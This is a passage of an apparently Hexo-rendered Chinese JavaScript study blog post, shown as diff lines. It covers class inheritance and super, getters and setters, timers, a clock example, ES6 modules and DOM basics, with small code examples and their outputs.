class="comment">&#x27;this&#x27; or returning from derived constructor</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>使用super，可以提高代码的重用性</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(name,age);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,swimspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">swimspeed</span>=swimspeed</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;dog&quot;</span>,<span class="number">15</span>,<span class="number">40</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">runspeed</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">dog</span></span><br><span class="line"><span class="comment">15</span></span><br><span class="line"><span class="comment">40</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以这样</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(); <span class="comment">//加一句这个</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>个人理解，就是你一旦在子类中有一个构造函数，那么不管父类有没有构造函数，你这个super()必须要有，它这个设定就是 <strong>优先</strong>确保父类的构造函数先被调用；</p>
+<p>当然在实际的代码中，父类是肯定有一个构造函数的，总之有了super，还是提高了代码的重写性，简洁点。</p>
+<blockquote>
+<p><strong>this和super</strong></p>
+<p>super() 从子类中调用父类的构造方法，this() 在同一类内调用其它方法</p>
+</blockquote>
+<p><strong>get 只读</strong></p>
+<p>引入</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">_score</span>);<span class="comment">//60</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">我如果想要让它后面加个单位呢？</span></span><br><span class="line"><span class="comment">也就是说我需要对这个值进行一个处理，当我输入的时候，我直接输出就可以拿到这个处理好的内容</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;p1._score&#125;</span> points`</span>);<span class="comment">//60 points</span></span><br></pre></td></tr></table></figure>
+
+<p>引入get后是这样的</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">score</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._score&#125;</span> points`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">score</span>=<span class="number">1231231123</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br></pre></td></tr></table></figure>
+
+<p>现在的值是<strong>只读</strong>的，如果我想改一个值怎么办，比如</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_ok</span>=<span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">score</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._score&#125;</span> points`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">ok</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._ok&#125;</span> n`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">ok</span>=<span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">ok</span>);<span class="comment">//12 ok</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>set 修改</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">ok</span>(<span class="params">val</span>)&#123;</span><br><span class="line">        <span class="comment">//其它限制，对该值的修改限制</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          if(val&gt;800)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            val=800</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(val&lt;0)&#123;</span></span><br><span class="line"><span class="comment">            val=200</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_ok</span>=val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line">p1.<span class="property">score</span>=<span class="number">456</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">ok</span>=<span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">ok</span>);<span class="comment">//789 n</span></span><br></pre></td></tr></table></figure>
+
+<p>算是为了保护自己的私有属性吧，使用get，set可以保护私有属性的同时，提供外部访问的条件</p>
+<p><strong>objects 作为参数</strong></p>
+<p>这里已经体现到封装思想了，就是用户使用的时候，只需要调用该方法，知道输出就行，不需要考虑内部细节，且一次调用就实现要求即可</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yujj&quot;</span>,<span class="number">12</span>,<span class="number">45</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Ygffgh&quot;</span>,<span class="number">23</span>,<span class="number">35</span>);</span><br><span class="line"><span class="comment">//对一个object，我要输出三个属性，就要自己写三个输出</span></span><br><span class="line"><span class="comment">//那我封装一个</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">show</span>(p1);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">p</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">name</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">age</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">score</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">45</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//修改也可以</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">change</span>(p1,<span class="string">&quot;12312321&quot;</span>);</span><br><span class="line"><span class="title function_">show</span>(p1);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change</span>(<span class="params">p,val</span>)&#123;</span><br><span class="line">    p.<span class="property">age</span>=val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">12312321</span></span><br><span class="line"><span class="comment">45</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>数组和对象</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yujj&quot;</span>,<span class="number">12</span>,<span class="number">45</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;gffgh&quot;</span>,<span class="number">23</span>,<span class="number">35</span>);</span><br><span class="line"><span class="keyword">const</span> ps=[p1,p2];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ps[<span class="number">0</span>].<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ps[<span class="number">1</span>].<span class="property">name</span>);</span><br><span class="line">ps[<span class="number">0</span>].<span class="title function_">eat</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">gffgh</span></span><br><span class="line"><span class="comment">Yujj is eating!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>匿名对象</strong></p>
+<p>不需要想名字啦</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name,score</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// const p1=new Person(&quot;asda&quot;,123);</span></span><br><span class="line"><span class="comment">// const p2=new Person(&quot;sqwe&quot;,465);</span></span><br><span class="line"><span class="comment">// const p3=new Person(&quot;xzc&quot;,789);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ps=[</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;asda&quot;</span>,<span class="number">123</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sqwe&quot;</span>,<span class="number">465</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;xzc&quot;</span>,<span class="number">789</span>)</span><br><span class="line">]</span><br><span class="line">ps.<span class="title function_">forEach</span>(<span class="function">(<span class="params">p</span>)=&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;p.name&#125;</span>,<span class="subst">$&#123;p.score&#125;</span>`</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">asda,123</span></span><br><span class="line"><span class="comment">sqwe,465</span></span><br><span class="line"><span class="comment">xzc,789</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// ps.forEach(print);</span></span><br><span class="line"><span class="comment">// print(ps[0]);</span></span><br><span class="line"><span class="comment">// function print(p)&#123;</span></span><br><span class="line"><span class="comment">//  //console.log(`$&#123;p.name&#125;,$&#123;p.score&#125;`);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>捕获异常</strong></p>
+<p><strong>try…catch</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">lag</span>();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">message</span>);</span><br><span class="line">    <span class="comment">//console.lag is not a function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>try…throw…catch</strong></p>
+<p>手动抛出一个异常</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> x=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;Enter #&quot;</span>);</span><br><span class="line">    x=<span class="title class_">Number</span>(x);</span><br><span class="line">    <span class="comment">//弹窗内容是非数字时</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(x)) <span class="keyword">throw</span> <span class="string">&quot;this is NaN,not number&quot;</span>;</span><br><span class="line">    <span class="comment">//弹窗内容是空时</span></span><br><span class="line">    <span class="keyword">if</span>(x==<span class="string">&quot;&quot;</span>) <span class="keyword">throw</span> <span class="string">&quot;this is empty,not number&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">   </span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>setTimeout()</strong></p>
+<p>浏览器在一个指定的等候时间去执行指定代码</p>
+<p>每一次刷新，它都会<strong>循环</strong>执行代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> hobby=<span class="string">&quot;篮球&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> price=<span class="number">100.99</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行的方法，和等候时间</span></span><br><span class="line"><span class="built_in">setTimeout</span>(firstmess,<span class="number">3000</span>,hobby,price);</span><br><span class="line"><span class="built_in">setTimeout</span>(secondmess,<span class="number">5000</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(thirdmess,<span class="number">9000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">firstmess</span>(<span class="params">hobby,price</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`the <span class="subst">$&#123;hobby&#125;</span> is $<span class="subst">$&#123;price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">secondmess</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`this is $100`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">thirdmess</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`the final`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>**clearTimeout() **</p>
+<p>指定一个id，取消该 setTimeout() 所设定的定时执行，不会影响其它id的setTimeout() </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let hobby=&quot;篮球&quot;;</span><br><span class="line">let price=100.99;</span><br><span class="line"></span><br><span class="line">//执行的方法，和等候时间</span><br><span class="line">let id1=setTimeout(firstmess,3000,hobby,price);</span><br><span class="line">let id2=setTimeout(secondmess,5000);</span><br><span class="line">let id3=setTimeout(thirdmess,9000);</span><br><span class="line"></span><br><span class="line">function firstmess(hobby,price)&#123;</span><br><span class="line">    alert(`the $&#123;hobby&#125; is $$&#123;price&#125;`);</span><br><span class="line">&#125;</span><br><span class="line">function secondmess()&#123;</span><br><span class="line">    alert(`this is $100`);</span><br><span class="line">&#125;</span><br><span class="line">function thirdmess()&#123;</span><br><span class="line">    alert(`the final`);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;mybutton&quot;).onclick=function()&#123;</span><br><span class="line">  //  clearTimeout(id1);</span><br><span class="line">    clearTimeout(id2);//点击按钮后，不会执行id2</span><br><span class="line">    //clearTimeout(id3);</span><br><span class="line">    //alert(`取消id2`);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>setInterval 定时器</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//setInterval() //定时器</span></span><br><span class="line"><span class="keyword">let</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> max=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;输入一个数&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myTimer=<span class="built_in">setInterval</span>(countUp,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">countUp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">    <span class="keyword">if</span>(count&gt;=max)&#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(myTimer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//间隔一定时间输出1-9</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="钟表设计"><a href="#钟表设计" class="headerlink" title="钟表设计"></a><strong>钟表设计</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mylabel=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">update</span>();</span><br><span class="line"><span class="built_in">setInterval</span>(update,<span class="number">1000</span>); <span class="comment">//动态执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> date=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="comment">//mylabel.innerHTML=date;</span></span><br><span class="line">    mylabel.<span class="property">innerHTML</span>=<span class="title function_">fomatTime</span>(date);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fomatTime</span>(<span class="params">date</span>)&#123;<span class="comment">//形式化date</span></span><br><span class="line">        <span class="keyword">let</span> hours=date.<span class="title function_">getHours</span>();</span><br><span class="line">        <span class="keyword">let</span> minutes=date.<span class="title function_">getMinutes</span>();</span><br><span class="line">        <span class="keyword">let</span> seconds=date.<span class="title function_">getSeconds</span>();</span><br><span class="line">        <span class="keyword">let</span> amorpm=hours&gt;=<span class="number">12</span>?<span class="string">&quot;pm&quot;</span>:<span class="string">&quot;am&quot;</span>;</span><br><span class="line"></span><br><span class="line">        hours=(hours%<span class="number">12</span>)||<span class="number">12</span>;<span class="comment">//12小时制</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//单数添0，凑两位</span></span><br><span class="line">        hours=<span class="title function_">singlezero</span>(hours);</span><br><span class="line">        minutes=<span class="title function_">singlezero</span>(minutes);</span><br><span class="line">        seconds=<span class="title function_">singlezero</span>(seconds);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;hours&#125;</span>:<span class="subst">$&#123;minutes&#125;</span>:<span class="subst">$&#123;seconds&#125;</span> <span class="subst">$&#123;amorpm&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">singlezero</span>(<span class="params">time</span>)&#123;<span class="comment">//单数添0</span></span><br><span class="line">        time=time.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> time.<span class="property">length</span>&lt;<span class="number">2</span>?<span class="string">&quot;0&quot;</span>+<span class="attr">time</span>:time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>promise</strong></p>
+<p><a href="https://www.runoob.com/js/js-promise.html">https://www.runoob.com/js/js-promise.html</a></p>
+<h3 id="ES6-moudules"><a href="#ES6-moudules" class="headerlink" title="ES6 moudules"></a><strong>ES6 moudules</strong></h3><p>这个相当于引用外部文件</p>
+<p><a href="https://www.runoob.com/w3cnote/es6-module.html">https://www.runoob.com/w3cnote/es6-module.html</a></p>
+<p>模块化，导入导出两个模块</p>
+<p>给定 math_util.js</p>
+<p><strong>导出</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">PI</span>=<span class="number">3.1415926</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getC</span>(<span class="params">r</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*<span class="variable constant_">PI</span>*r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getA</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">PI</span>*<span class="title class_">Math</span>.<span class="title function_">pow</span>(r,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>导入</strong></p>
+<p>index.js去导入</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="variable constant_">PI</span>,getC,getA&#125; <span class="keyword">from</span> <span class="string">&quot;./math_util.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getC</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getA</span>(<span class="number">2</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">3.1415926</span></span><br><span class="line"><span class="comment">12.5663704</span></span><br><span class="line"><span class="comment">28.2743334</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Mathutil</span> <span class="keyword">from</span> <span class="string">&quot;./math_util.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="property">PI</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="title function_">getC</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Mathutil</span>.<span class="title function_">getA</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
+
+<p>html文件的&lt;script&gt;需要引入</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;module&quot;</span> src=<span class="string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>Document Object Model，一种API接口，可以改变页面内容</p>
+<p><a href="https://www.runoob.com/js/js-htmldom.html">https://www.runoob.com/js/js-htmldom.html</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>);<span class="comment">//大致标签</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="variable language_">document</span>);<span class="comment">//细节属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">title</span>);<span class="comment">//网页标题</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">URL</span>);<span class="comment">//网页url</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span>=<span class="string">&quot;Here we go!&quot;</span>;<span class="comment">//更改网页标题</span></span><br><span class="line"><span class="comment">//document.location=&quot;http://www.google.com&quot;;//跳转到google页面</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;skyblue&quot;</span>;<span class="comment">//更改页面背景</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hello！！&quot;</span>;<span class="comment">//元素名字</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h3><p>html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;蓝色&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- checked=&quot;checked&quot; 是默认选中--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;r1&quot;</span>&gt;</span>blue<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;红色&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;r2&quot;</span>&gt;</span>red<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span 